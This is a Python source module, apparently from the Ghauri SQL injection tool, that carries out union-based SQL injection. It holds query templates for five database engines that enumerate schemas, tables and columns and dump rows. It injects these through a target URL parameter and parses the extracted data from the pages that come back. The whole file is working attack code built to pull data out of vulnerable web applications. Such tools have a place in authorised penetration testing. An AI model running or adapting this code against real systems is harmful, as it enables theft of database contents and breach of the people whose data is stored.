#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""
Union-based Data Extraction Module

This module provides comprehensive data extraction capabilities
for union-based SQL injection vulnerabilities.
"""

import re
import time
from typing import List, Dict, Optional, Tuple
from ghauri.logger.colored_logger import logger
from ghauri.core.inject import inject_expression
from ghauri.common.utils import get_filtered_page_content
from ghauri.core.union_payloads import UnionPayloadGenerator


class UnionExtractor:
    """Comprehensive data extraction for union-based SQL injection"""
    
    def __init__(self):
        self.payload_generator = UnionPayloadGenerator()
        self.extraction_queries = {
            'mysql': {
                'version': 'VERSION()',
                'user': 'USER()',
                'database': 'DATABASE()',
                'hostname': '@@HOSTNAME',
                'databases': "SELECT GROUP_CONCAT(SCHEMA_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.SCHEMATA",
                'tables': "SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{database}'",
                'columns': "SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{database}' AND TABLE_NAME='{table}'",
                'count': "SELECT COUNT(*) FROM {database}.{table}",
                'dump': "SELECT GROUP_CONCAT(CONCAT({columns}) SEPARATOR '|') FROM {database}.{table} LIMIT {limit} OFFSET {offset}"
            },
            'postgresql': {
                'version': 'VERSION()',
                'user': 'USER',
                'database': 'CURRENT_DATABASE()',
                'hostname': 'INET_SERVER_ADDR()',
                'databases': "SELECT STRING_AGG(datname,',') FROM pg_database WHERE datistemplate=false",
                'tables': "SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='public'",
                'columns': "SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
                'count': "SELECT COUNT(*) FROM {table}",
                'dump': "SELECT STRING_AGG(CONCAT({columns}),'|') FROM (SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}) t"
            },
            'mssql': {
                'version': '@@VERSION',
                'user': 'USER_NAME()',
                'database': 'DB_NAME()',
                'hostname': '@@SERVERNAME',
                'databases': "SELECT STUFF((SELECT ','+name FROM sys.databases FOR XML PATH('')),1,1,'')",
                'tables': "SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')",
                'columns': "SELECT STUFF((SELECT ','+name FROM sys.columns WHERE object_id=OBJECT_ID('{table}') FOR XML PATH('')),1,1,'')",
                'count': "SELECT COUNT(*) FROM {table}",
                'dump': "SELECT STUFF((SELECT '|'+CONCAT({columns}) FROM (SELECT TOP {limit} {columns} FROM {table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS) t FOR XML PATH('')),1,1,'')"
            },
            'oracle': {
                'version': "(SELECT banner FROM v$version WHERE rownum=1)",
                'user': 'USER',
                'database': "(SELECT name FROM v$database)",
                'hostname': "(SELECT host_name FROM v$instance)",
                'databases': "(SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users)",
                'tables': "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)",
                'columns': "(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='{table}')",
                'count': "(SELECT COUNT(*) FROM {table})",
                'dump': "(SELECT LISTAGG(CONCAT({columns}),'|') WITHIN GROUP (ORDER BY ROWNUM) FROM (SELECT {columns} FROM {table} WHERE ROWNUM BETWEEN {offset}+1 AND {offset}+{limit}))"
            },
            'sqlite': {
                'version': "sqlite_version()",
                'user': "'sqlite_user'",
                'database': "'main'",
                'hostname': "'localhost'",
                'databases': "'main'",
                'tables': "SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table'",
                'columns': "SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{table}')",
                'count': "SELECT COUNT(*) FROM {table}",
                'dump': "SELECT GROUP_CONCAT({columns},'|') FROM (SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset})"
            }
        }
    
    def extract_basic_info(self, base, parameter, column_count: int, injectable_columns: List[int],
                          url="", data="", headers="", injection_type="", proxy="",
                          timeout=30, delay=0, prefix=None, suffix=None,
                          is_json=False, is_multipart=False, dbms='mysql') -> Dict:
        """
        Extract basic database information
        
        Args:
            base: Base response object
            parameter: Parameter object
            column_count: Number of columns
            injectable_columns: List of injectable column positions
            dbms: Database management system
            
        Returns:
            Dict containing extracted basic information
        """
        if not injectable_columns:
            return {}
        
        logger.info("Extracting basic database information")
        
        dbms = dbms.lower() if dbms else 'mysql'
        queries = self.extraction_queries.get(dbms, self.extraction_queries['mysql'])
        
        basic_info = {}
        info_types = ['version', 'user', 'database', 'hostname']
        
        for info_type in info_types:
            if delay > 0:
                time.sleep(delay)
            
            query = queries.get(info_type)
            if not query:
                continue
            
            logger.payload(f"Extracting {info_type}")
            
            result = self._extract_single_value(
                base, parameter, column_count, injectable_columns[0],
                query, url, data, headers, injection_type, proxy,
                timeout, delay, prefix, suffix, is_json, is_multipart, dbms
            )
            
            if result:
                basic_info[info_type] = result
                logger.success(f"{info_type.capitalize()}: {result}")
            else:
                logger.warning(f"Failed to extract {info_type}")
        
        return basic_info
    
    def extract_databases(self, base, parameter, column_count: int, injectable_columns: List[int],
                         url="", data="", headers="", injection_type="", proxy="",
                         timeout=30, delay=0, prefix=None, suffix=None,
                         is_json=False, is_multipart=False, dbms='mysql') -> List[str]:
        """
        Extract available databases
        
        Returns:
            List of database names
        """
        if not injectable_columns:
            return []
        
        logger.info("Extracting available databases")
        
        dbms = dbms.lower() if dbms else 'mysql'
        queries = self.extraction_queries.get(dbms, self.extraction_queries['mysql'])
        
        query = queries.get('databases')
        if not query:
            logger.warning(f"No database enumeration query for {dbms}")
            return []
        
        result = self._extract_single_value(
            base, parameter, column_count, injectable_columns[0],
            query, url, data, headers, injection_type, proxy,
            timeout, delay, prefix, suffix, is_json, is_multipart, dbms
        )
        
        if result:
            databases = [db.strip() for db in result.split(',') if db.strip()]
            logger.success(f"Found {len(databases)} databases: {databases}")
            return databases
        
        logger.warning("Failed to extract databases")
        return []
    
    def extract_tables(self, base, parameter, column_count: int, injectable_columns: List[int],
                      database: str, url="", data="", headers="", injection_type="",
                      proxy="", timeout=30, delay=0, prefix=None, suffix=None,
                      is_json=False, is_multipart=False, dbms='mysql') -> List[str]:
        """
        Extract tables from specified database
        
        Args:
            database: Target database name
            
        Returns:
            List of table names
        """
        if not injectable_columns or not database:
            return []
        
        logger.info(f"Extracting tables from database: {database}")
        
        dbms = dbms.lower() if dbms else 'mysql'
        queries = self.extraction_queries.get(dbms, self.extraction_queries['mysql'])
        
        query = queries.get('tables')
        if not query:
            logger.warning(f"No table enumeration query for {dbms}")
            return []
        
        # Format query with database name
        formatted_query = query.format(database=database)
        
        result = self._extract_single_value(
            base, parameter, column_count, injectable_columns[0],
            formatted_query, url, data, headers, injection_type, proxy,
            timeout, delay, prefix, suffix, is_json, is_multipart, dbms
        )
        
        if result:
            tables = [table.strip() for table in result.split(',') if table.strip()]
            logger.success(f"Found {len(tables)} tables in {database}: {tables}")
            return tables
        
        logger.warning(f"Failed to extract tables from {database}")
        return []
    
    def extract_columns(self, base, parameter, column_count: int, injectable_columns: List[int],
                       database: str, table: str, url="", data="", headers="",
                       injection_type="", proxy="", timeout=30, delay=0, prefix=None,
                       suffix=None, is_json=False, is_multipart=False, dbms='mysql') -> List[str]:
        """
        Extract columns from specified table
        
        Args:
            database: Target database name
            table: Target table name
            
        Returns:
            List of column names
        """
        if not injectable_columns or not table:
            return []
        
        logger.info(f"Extracting columns from table: {database}.{table}")
        
        dbms = dbms.lower() if dbms else 'mysql'
        queries = self.extraction_queries.get(dbms, self.extraction_queries['mysql'])
        
        query = queries.get('columns')
        if not query:
            logger.warning(f"No column enumeration query for {dbms}")
            return []
        
        # Format query with database and table names
        formatted_query = query.format(database=database, table=table)
        
        result = self._extract_single_value(
            base, parameter, column_count, injectable_columns[0],
            formatted_query, url, data, headers, injection_type, proxy,
            timeout, delay, prefix, suffix, is_json, is_multipart, dbms
        )
        
        if result:
            columns = [col.strip() for col in result.split(',') if col.strip()]
            logger.success(f"Found {len(columns)} columns in {table}: {columns}")
            return columns
        
        logger.warning(f"Failed to extract columns from {table}")
        return []
    
    def dump_table_data(self, base, parameter, column_count: int, injectable_columns: List[int],
                       database: str, table: str, columns: List[str], limit: int = 100,
                       url="", data="", headers="", injection_type="", proxy="",
                       timeout=30, delay=0, prefix=None, suffix=None,
                       is_json=False, is_multipart=False, dbms='mysql') -> List[Dict]:
        """
        Dump data from specified table
        
        Args:
            database: Target database name
            table: Target table name
            columns: List of column names to dump
            limit: Maximum number of rows to dump
            
        Returns:
            List of dictionaries containing row data
        """
        if not injectable_columns or not table or not columns:
            return []
        
        logger.info(f"Dumping data from table: {database}.{table}")
        
        dbms = dbms.lower() if dbms else 'mysql'
        queries = self.extraction_queries.get(dbms, self.extraction_queries['mysql'])
        
        # First, get row count
        count_query = queries.get('count')
        if count_query:
            formatted_count_query = count_query.format(database=database, table=table)
            row_count = self._extract_single_value(
                base, parameter, column_count, injectable_columns[0],
                formatted_count_query, url, data, headers, injection_type, proxy,
                timeout, delay, prefix, suffix, is_json, is_multipart, dbms
            )
            
            if row_count and row_count.isdigit():
                total_rows = int(row_count)
                logger.info(f"Table {table} contains {total_rows} rows")
                limit = min(limit, total_rows)
            else:
                logger.warning("Could not determine row count")
        
        # Prepare column list for query
        column_list = ','.join(columns)
        
        dump_query = queries.get('dump')
        if not dump_query:
            logger.warning(f"No dump query for {dbms}")
            return []
        
        dumped_data = []
        batch_size = 10  # Dump in batches
        
        for offset in range(0, limit, batch_size):
            current_limit = min(batch_size, limit - offset)
            
            if delay > 0:
                time.sleep(delay)
            
            # Format dump query
            formatted_query = dump_query.format(
                database=database,
                table=table,
                columns=column_list,
                limit=current_limit,
                offset=offset
            )
            
            logger.payload(f"Dumping rows {offset+1}-{offset+current_limit}")
            
            result = self._extract_single_value(
                base, parameter, column_count, injectable_columns[0],
                formatted_query, url, data, headers, injection_type, proxy,
                timeout, delay, prefix, suffix, is_json, is_multipart, dbms
            )
            
            if result:
                # Parse result into rows
                rows = result.split('|')
                for row in rows:
                    if row.strip():
                        # Split row data by column count
                        row_data = row.split(',')
                        if len(row_data) == len(columns):
                            row_dict = {}
                            for i, col in enumerate(columns):
                                row_dict[col] = row_data[i].strip()
                            dumped_data.append(row_dict)
            else:
                logger.warning(f"Failed to dump batch starting at offset {offset}")
                break
        
        logger.success(f"Successfully dumped {len(dumped_data)} rows from {table}")
        return dumped_data
    
    def _extract_single_value(self, base, parameter, column_count: int, injectable_column: int,
                            extraction_query: str, url, data, headers, injection_type,
                            proxy, timeout, delay, prefix, suffix, is_json, is_multipart,
                            dbms) -> Optional[str]:
        """
        Extract a single value using union injection
        
        Args:
            injectable_column: Column position to use for extraction
            extraction_query: SQL query to extract data
            
        Returns:
            Extracted value or None if extraction failed
        """
        payloads = self.payload_generator.generate_extraction_payloads(
            column_count, [injectable_column], extraction_query, dbms
        )
        
        for payload in payloads:
            if prefix:
                payload = f"{prefix} {payload}"
            if suffix:
                payload = f"{payload} {suffix}"
            
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=payload,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            
            if not attack.ok:
                continue
            
            content = get_filtered_page_content(attack.text, True)
            
            # Extract data between START: and END markers
            match = re.search(r'START:(.*?)END', content, re.DOTALL)
            if match:
                extracted_value = match.group(1).strip()
                if extracted_value and extracted_value != 'NULL':
                    return extracted_value
            
            # Fallback: look for any new content not in base response
            base_content = get_filtered_page_content(base.text, True)
            if content != base_content:
                # Try to find the extracted data by comparing responses
                content_lines = content.split('\n')
                base_lines = base_content.split('\n')
                
                for line in content_lines:
                    if line not in base_lines and line.strip():
                        # This might be our extracted data
                        cleaned_line = re.sub(r'[^\w\s.-]', '', line).strip()
                        if cleaned_line and len(cleaned_line) > 2:
                            return cleaned_line
        
        return None
    
    def extract_custom_query(self, base, parameter, column_count: int, injectable_columns: List[int],
                           custom_query: str, url="", data="", headers="", injection_type="",
                           proxy="", timeout=30, delay=0, prefix=None, suffix=None,
                           is_json=False, is_multipart=False, dbms='mysql') -> Optional[str]:
        """
        Execute custom extraction query
        
        Args:
            custom_query: Custom SQL query to execute
            
        Returns:
            Query result or None if execution failed
        """
        if not injectable_columns:
            return None
        
        logger.info(f"Executing custom query: {custom_query}")
        
        result = self._extract_single_value(
            base, parameter, column_count, injectable_columns[0],
            custom_query, url, data, headers, injection_type, proxy,
            timeout, delay, prefix, suffix, is_json, is_multipart, dbms
        )
        
        if result:
            logger.success(f"Custom query result: {result}")
        else:
            logger.warning("Custom query execution failed")
        
        return result